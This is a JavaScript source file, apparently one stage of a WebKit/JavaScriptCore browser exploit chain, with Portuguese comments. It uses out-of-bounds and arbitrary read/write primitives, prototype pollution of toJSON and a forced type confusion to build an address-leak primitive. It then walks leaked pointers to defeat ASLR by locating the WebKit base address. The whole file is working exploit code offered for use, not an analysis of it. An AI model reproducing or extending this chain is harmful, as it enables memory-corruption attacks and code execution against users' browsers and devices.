// js/script3/UltimateExploit.mjs (v103 - Final com Cadeia Direta)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    arb_read,
    arb_write,
    oob_write_absolute,
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO, OOB_CONFIG } from '../config.mjs';

export const FNAME_MODULE_ULTIMATE = "Exploit_Final_R64_Direct_Chain";

const TC_TRIGGER_DV_M_LENGTH_OFFSET = 0x58 + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;

function isValidPointer(ptr) {
    if (!ptr || !isAdvancedInt64Object(ptr)) return false;
    // Um ponteiro válido não deve ser um NaN/Infinity ou nulo/muito baixo.
    if ((ptr.high() & 0x7FF00000) === 0x7FF00000) return false; 
    if (ptr.high() === 0 && ptr.low() < 0x10000) return false;
    return true;
}

function float64AsInt64(f) {
    if (typeof f !== 'number') return new AdvancedInt64(0, 0);
    let buf = new ArrayBuffer(8);
    new Float64Array(buf)[0] = f;
    const low = new Uint32Array(buf)[0];
    const high = new Uint32Array(buf)[1];
    return new AdvancedInt64(low, high);
}

// Esta função é a nossa primitiva de vazamento de endereço inicial.
async function initial_info_leak(object_to_leak) {
    logS3("[InfoLeak] Tentando 'addrof' com Type Confusion em Array 'uncaged'...", "info");
    
    // 1. A vítima é um array com floats para garantir armazenamento "unboxed"
    let victim_array = [1.1, 2.2, 3.3, 4.4];
    let probe_result = { tc_triggered: false, this_type: null };

    // 2. A sonda que planta o objeto no primeiro slot do array confuso
    function toJSON_AddrofProbe() {
        probe_result.tc_triggered = true;
        probe_result.this_type = Object.prototype.toString.call(this);
        if (probe_result.this_type === "[object Array]") {
            this[0] = object_to_leak;
        }
    }
    
    // 3. Aciona a vulnerabilidade
    const ppKey = 'toJSON';
    let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
    try {
        Object.defineProperty(Object.prototype, ppKey, { value: toJSON_AddrofProbe, writable: true, configurable: true });
        oob_write_absolute(TC_TRIGGER_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4); 
        await PAUSE_S3(50);
        JSON.stringify(victim_array);
    } finally {
        if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc);
    }

    if (probe_result.this_type !== "[object Array]") {
        throw new Error(`Falha: A Type Confusion ocorreu em ${probe_result.this_type}, não em um Array.`);
    }
    logS3("[InfoLeak] SUCESSO: Type Confusion ocorreu em um Array 'uncaged'!", "vuln");

    // 4. Lê o valor de volta, esperando que o ponteiro tenha sido reinterpretado como um double
    const leaked_double = victim_array[0];
    if (typeof leaked_double !== 'number') {
        throw new Error(`O valor vazado não é um número (double), mas sim ${typeof leaked_double}. A técnica de reinterpretação de tipo falhou.`);
    }
    logS3(`[InfoLeak] Valor lido do slot [0] como double: ${leaked_double}`, "leak");

    // 5. Converte de volta para um inteiro de 64 bits
    const leaked_addr = float64AsInt64(leaked_double);
    if (!isValidPointer(leaked_addr)) {
        throw new Error(`Endereço vazado (${leaked_addr.toString(true)}) é inválido.`);
    }

    return leaked_addr;
}


// --- Função Principal do Exploit ---
export async function run_full_exploit_chain() {
    await triggerOOB_primitive({ force_reinit: true });
    
    // ETAPA 1: Obter o endereço de uma função usando nossa brecha 'uncaged'
    logS3("--- Etapa 1: Obtendo endereço inicial via Uncaged TC Addrof ---", "subtest");
    const targetFunction = function finalTargetForLeak() {};
    const func_addr = await initial_info_leak(targetFunction);
    logS3(`SUCESSO! Endereço da função alvo vazado: ${func_addr.toString(true)}`, "good");
    await PAUSE_S3(100);

    // ETAPA 2: Usar o endereço vazado e arb_read para encontrar a base do WebKit
    logS3("--- Etapa 2: Navegando na memória com arb_read para encontrar a base do WebKit ---", "subtest");
    
    const executable_ptr = await arb_read(func_addr.add(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET), 8);
    if (!isValidPointer(executable_ptr)) throw new Error("Ponteiro para ExecutableInstance inválido.");
    logS3(`  -> Ponteiro ExecutableInstance: ${executable_ptr.toString(true)}`, "leak");
    
    const jit_code_ptr = await arb_read(executable_ptr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET), 8);
    if (!isValidPointer(jit_code_ptr)) throw new Error("Ponteiro para JIT Code inválido.");
    logS3(`  -> Ponteiro JIT Code: ${jit_code_ptr.toString(true)}`, "leak");

    const webkit_base = jit_code_ptr.and(new AdvancedInt64(0x0, ~0xFFF));
    
    return { success: true, webkit_base: webkit_base.toString(true), strategy: "Uncaged Addrof -> arb_read chain" };
}
